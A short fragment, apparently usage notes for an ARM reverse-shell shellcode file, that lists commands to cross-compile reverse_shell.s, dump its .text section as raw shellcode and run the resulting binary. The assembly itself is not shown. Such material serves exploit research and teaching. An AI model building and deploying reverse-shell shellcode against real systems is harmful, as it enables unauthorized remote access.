...
Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static reverse_shell.s -o ./reverse_shell.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=reverse_shell.raw ./reverse_shell.elf
Run            :
	$ ./reverse_shell.elf
